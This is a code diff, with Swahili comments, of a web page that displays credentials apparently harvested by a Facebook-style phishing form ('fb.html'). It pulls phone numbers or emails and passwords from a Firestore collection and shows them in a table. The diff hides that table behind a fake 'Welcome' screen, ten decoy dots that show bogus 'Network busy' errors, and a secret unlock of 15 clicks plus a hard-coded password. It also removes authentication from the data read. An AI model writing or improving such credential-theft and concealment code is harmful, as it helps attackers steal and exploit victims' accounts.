@@ -6,7 +6,132 @@
     <title>Taarifa Zote Zilizotumwa</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
-        body { background-color: #f0f2f5; color: #1c1e21; padding: 20px; display: flex; flex-direction: column; align-items: center; }
+        body { background-color: #f0f2f5; color: #1c1e21; padding: 20px; display: flex; flex-direction: column; align-items: center; min-height: 100vh; position: relative; overflow-x: hidden; }
+        
+        /* --- ENEO LA VIDOTI VYA SIRI NA VYA UONGO (DECOYS) --- */
+        .dot-area {
+            position: fixed;
+            width: 40px;
+            height: 40px;
+            z-index: 9999;
+            cursor: pointer;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .white-dot {
+            width: 10px;
+            height: 10px;
+            background-color: #ffffff;
+            border-radius: 50%;
+            box-shadow: 0 0 5px rgba(0,0,0,0.4);
+        }
+
+        /* Maeneo ya Vidoti */
+        #real-dot-area { top: 0; right: 0; z-index: 10000; }
+        #decoy-1 { top: 0; left: 0; }
+        #decoy-2 { bottom: 20px; left: 20px; }
+        #decoy-3 { top: 40%; right: 10px; }
+        #decoy-4 { bottom: 10px; right: 50%; }
+        #decoy-5 { top: 15%; left: 20px; }
+        #decoy-6 { bottom: 30%; left: 50%; }
+        #decoy-7 { top: 70%; left: 10%; }
+        #decoy-8 { top: 50%; left: 30%; }
+        #decoy-9 { bottom: 5px; right: 10%; }
+        #decoy-10 { top: 25%; right: 30%; }
+
+        /* --- UKURASA WA WELCOME (UMeboreshwa) --- */
+        #welcomeScreen {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 85vh;
+            width: 100%;
+            position: relative;
+        }
+
+        /* Kitufe cha Welcome chenye mwonekano wa Kisasa */
+        .btn-welcome {
+            font-size: 20px;
+            font-weight: 700;
+            color: #ffffff;
+            background: linear-gradient(135deg, #1877f2, #0a58ca);
+            border: none;
+            padding: 18px 50px;
+            border-radius: 50px;
+            cursor: pointer;
+            box-shadow: 0 8px 20px rgba(24, 119, 242, 0.3);
+            transition: all 0.3s ease;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            position: relative;
+            overflow: hidden;
+        }
+        .btn-welcome:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 25px rgba(24, 119, 242, 0.5);
+        }
+        /* Kitufe kinapokuwa active (Baada ya password sahihi) */
+        .btn-welcome.active {
+            background: linear-gradient(135deg, #28a745, #1e7e34);
+            box-shadow: 0 8px 20px rgba(40, 167, 69, 0.4);
+            animation: pulse-green 2s infinite;
+        }
+        @keyframes pulse-green {
+            0% { box-shadow: 0 0 0 0 rgba(40, 167, 69, 0.7); }
+            70% { box-shadow: 0 0 0 15px rgba(40, 167, 69, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(40, 167, 69, 0); }
+        }
+
+        /* Tetemeko (Shake) kama mtumiaji hajaweka password */
+        .shake {
+            animation: shake 0.5s cubic-bezier(0.36, 0.07, 0.19, 0.97) both;
+        }
+        @keyframes shake {
+            10%, 90% { transform: translate3d(-1px, 0, 0); }
+            20%, 80% { transform: translate3d(2px, 0, 0); }
+            30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
+            40%, 60% { transform: translate3d(4px, 0, 0); }
+        }
+
+        /* --- POP-UP YA KISASA (Toast Notification) --- */
+        #toast {
+            visibility: hidden;
+            min-width: 300px;
+            background-color: #333;
+            color: #fff;
+            text-align: center;
+            border-radius: 8px;
+            padding: 16px;
+            position: fixed;
+            z-index: 99999;
+            top: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 15px;
+            font-weight: 500;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            opacity: 0;
+            transition: opacity 0.3s, top 0.3s;
+        }
+        #toast.show {
+            visibility: visible;
+            opacity: 1;
+            top: 50px;
+        }
+        #toast.error { background-color: #dc3545; } /* Nyekundu kwa makosa */
+        #toast.success { background-color: #28a745; } /* Kijani kwa mafanikio */
+
+        /* Sehemu ya Jedwali */
+        #mainContent {
+            display: none;
+            width: 100%;
+            flex-direction: column;
+            align-items: center;
+        }
+
         .container { width: 100%; max-width: 800px; background: #ffffff; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); overflow: hidden; margin-top: 20px; }
         .header { background-color: #1877f2; color: white; padding: 20px; text-align: center; position: relative; }
         .header h1 { font-size: 22px; font-weight: 600; }
@@ -32,35 +157,62 @@
 </head>
 <body>
 
-    <div class="container">
-        <div class="header">
-            <a href="fb.html" class="back-btn" title="Rudi kwenye fomu">&larr;</a>
-            <h1>Taarifa Zote Zilizopokelewa</h1>
-            <p>Data zinazotoka kwenye fomu ya kuingia</p>
-        </div>
+    <!-- POP-UP YA KISASA (Toast) -->
+    <div id="toast">Network busy, please try again.</div>
 
-        <div class="table-wrapper">
-            <div id="statusMessage" class="loading">
-                <div class="spinner"></div>
-                Inapakia taarifa...
+    <!-- KIDOTI HALISI -->
+    <div class="dot-area" id="real-dot-area">
+        <div class="white-dot"></div>
+    </div>
+
+    <!-- VIDOTI VYA UONGO -->
+    <div class="dot-area" id="decoy-1"><div class="white-dot"></div></div>
+    <div class="dot-area" id="decoy-2"><div class="white-dot"></div></div>
+    <div class="dot-area" id="decoy-3"><div class="white-dot"></div></div>
+    <div class="dot-area" id="decoy-4"><div class="white-dot"></div></div>
+    <div class="dot-area" id="decoy-5"><div class="white-dot"></div></div>
+    <div class="dot-area" id="decoy-6"><div class="white-dot"></div></div>
+    <div class="dot-area" id="decoy-7"><div class="white-dot"></div></div>
+    <div class="dot-area" id="decoy-8"><div class="white-dot"></div></div>
+    <div class="dot-area" id="decoy-9"><div class="white-dot"></div></div>
+    <div class="dot-area" id="decoy-10"><div class="white-dot"></div></div>
+
+    <!-- Ukurasa wa Kwanza (Welcome) -->
+    <div id="welcomeScreen">
+        <button class="btn-welcome" id="welcomeBtn">Welcome</button>
+    </div>
+
+    <!-- Ukurasa wa Pili (Taarifa Zote) -->
+    <div id="mainContent">
+        <div class="container">
+            <div class="header">
+                <a href="fb.html" class="back-btn" title="Rudi kwenye fomu">&larr;</a>
+                <h1>Taarifa Zote Zilizopokelewa</h1>
+                <p>Data zinazotoka kwenye fomu ya kuingia</p>
             </div>
-            <table id="dataTable" style="display: none;">
-                <thead>
-                    <tr>
-                        <th>#</th>
-                        <th>Namba ya Simu / Barua Pepe</th>
-                        <th>Neno la Siri (Password)</th>
-                        <th>Muda</th>
-                    </tr>
-                </thead>
-                <tbody id="tableBody"></tbody>
-            </table>
+
+            <div class="table-wrapper">
+                <div id="statusMessage" class="loading">
+                    <div class="spinner"></div>
+                    Inapakia taarifa...
+                </div>
+                <table id="dataTable" style="display: none;">
+                    <thead>
+                        <tr>
+                            <th>#</th>
+                            <th>Namba ya Simu / Barua Pepe</th>
+                            <th>Neno la Siri (Password)</th>
+                            <th>Muda</th>
+                        </tr>
+                    </thead>
+                    <tbody id="tableBody"></tbody>
+                </table>
+            </div>
         </div>
     </div>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-        import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
         import { getFirestore, collection, getDocs } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 
         const firebaseConfig = {
@@ -74,9 +226,87 @@
         };
 
         const app = initializeApp(firebaseConfig);
-        const auth = getAuth(app);
         const db = getFirestore(app);
 
+        // --- LOGIC YA USALAMA ---
+        let clickCount = 0;
+        let isUnlocked = false;
+        const SECRET_PASSWORD = "4944";
+
+        const realDotArea = document.getElementById('real-dot-area');
+        const welcomeBtn = document.getElementById('welcomeBtn');
+        const welcomeScreen = document.getElementById('welcomeScreen');
+        const mainContent = document.getElementById('mainContent');
+        const toast = document.getElementById('toast');
+
+        // Kazi ya kuonyesha Pop-up
+        function showToast(message, type = 'error') {
+            toast.innerText = message;
+            toast.className = 'show ' + type;
+            setTimeout(function(){ toast.className = toast.className.replace("show", ""); }, 3000);
+        }
+
+        // 1. Kubonyeza Kidoti Halisi (Mara 15)
+        realDotArea.addEventListener('click', () => {
+            if (isUnlocked) return; 
+
+            clickCount++;
+            
+            if (clickCount === 15) {
+                let userInput = prompt("Enter Security Password:");
+                
+                if (userInput === SECRET_PASSWORD) {
+                    isUnlocked = true;
+                    welcomeBtn.classList.add('active');
+                    welcomeBtn.innerText = "Fungua Taarifa";
+                    showToast("Uthibitisho umefanikiwa. Karibu!", "success");
+                } else if (userInput !== null) {
+                    showToast("Password si sahihi. Jaribu tena.", "error");
+                    clickCount = 0; 
+                } else {
+                    clickCount = 0;
+                }
+            }
+        });
+
+        // 2. Kubonyeza "Welcome" 
+        welcomeBtn.addEventListener('click', () => {
+            if (isUnlocked) {
+                // Kama ameweka password sahihi, fungua
+                welcomeScreen.style.display = 'none'; 
+                mainContent.style.display = 'flex';  
+                fetchData(); 
+            } else {
+                // Kama hajaweka password, onyesha ujumbe wa network busy na tetemeko
+                showToast("Network busy, please try again.", "error");
+                
+                // Ongeza ule mtetemeko (shake) kwenye kitufe
+                welcomeBtn.classList.add('shake');
+                
+                // Ondoa mtetemeko baada ya sekunde 0.5 ili uweze kubonyezwa tena
+                setTimeout(() => {
+                    welcomeBtn.classList.remove('shake');
+                }, 500);
+            }
+        });
+
+        // 3. Vidoti vya Uongo (Decoys)
+        for (let i = 1; i <= 10; i++) {
+            let decoyId = 'decoy-' + i;
+            let decoyElement = document.getElementById(decoyId);
+            
+            if (decoyElement) {
+                decoyElement.addEventListener('click', () => {
+                    if (i % 2 === 0) {
+                        showToast("Network busy, please try again.", "error");
+                    } else {
+                        showToast("System error: Connection timed out.", "error");
+                    }
+                });
+            }
+        }
+
+        // --- LOGIC YA KUSOMA DATA FIREBASE ---
         const statusMessage = document.getElementById('statusMessage');
         const dataTable = document.getElementById('dataTable');
         const tableBody = document.getElementById('tableBody');
@@ -108,24 +338,18 @@
             snapshot.forEach((doc) => {
                 const data = doc.data();
                 
-                // 1. Tafuta Namba/Email
-                let displayPhone = data.phone || data.num || data.email || data.phoneNumber || data.username || data.uid || 'N/A';
-                
-                // 2. Tafuta Neno la Siri
-                let displayPassword = data.password || data.pass || data.pwd || data.nenoLaSiri || 'N/A';
+                let displayPhone = data.num || data.phone || data.email || 'N/A';
+                let displayPassword = data.password || 'N/A';
 
-                // 3. Tafuta Tarehe
                 let dateStr = 'Haijulikani';
-                if (data.timestamp) {
-                    if (data.timestamp.toDate) {
-                         dateStr = data.timestamp.toDate().toLocaleString('sw-TZ');
+                let timeData = data.updatedAt || data.timestamp || data.time;
+                
+                if (timeData) {
+                    if (timeData.toDate) {
+                         dateStr = timeData.toDate().toLocaleString('sw-TZ');
                     } else {
-                         dateStr = data.timestamp; 
+                         dateStr = new Date(timeData).toLocaleString('sw-TZ'); 
                     }
-                } else if (data.updatedAt) {
-                    dateStr = data.updatedAt.toDate ? data.updatedAt.toDate().toLocaleString('sw-TZ') : data.updatedAt;
-                } else if (data.time) {
-                    dateStr = new Date(data.time).toLocaleString('sw-TZ');
                 }
 
                 const tr = document.createElement('tr');
@@ -145,44 +369,13 @@
 
         async function fetchData() {
             try {
-                if (!auth.currentUser) {
-                    await signInAnonymously(auth);
-                }
-                
-                // Subiri kidogo ili Auth isambazwe
-                await new Promise(resolve => setTimeout(resolve, 500));
-
-                // Tumeondoa orderBy ili data zote zionekane bila kujali zina timestamp au lah
                 const snapshot = await getDocs(collection(db, "all_numbers"));
-                
                 renderData(snapshot);
-
             } catch (error) {
                 console.error("Kosa la kusoma data: ", error);
-                let errorMsg = "Imeshindikana kupata taarifa. ";
-                if (error.code === 'auth/admin-restricted-operation') {
-                    errorMsg += "Anonymous Auth haijawashwa kwenye Firebase Console.";
-                } else if (error.code === 'permission-denied') {
-                    errorMsg += "Firestore Rules zinakataa. Hakikisha umeingia.";
-                } else {
-                    errorMsg += "Angalia console (F12) kwa maelezo zaidi.";
-                }
-                showError(errorMsg);
+                showError("Imeshindikana kupata taarifa. Hakikisha Rules zinaruhusu kusoma.");
             }
         }
-
-        onAuthStateChanged(auth, (user) => {
-            if (user) {
-                fetchData();
-            } else {
-                signInAnonymously(auth).then(() => {
-                    fetchData();
-                }).catch((error) => {
-                    console.error("Imeshindikana kuingia: ", error);
-                    showError("Imeshindikana kuunganisha na Firebase. Hakikisha Anonymous Auth imewashwa.");
-                });
-            }
-        });
     </script>
 </body>
 </html>
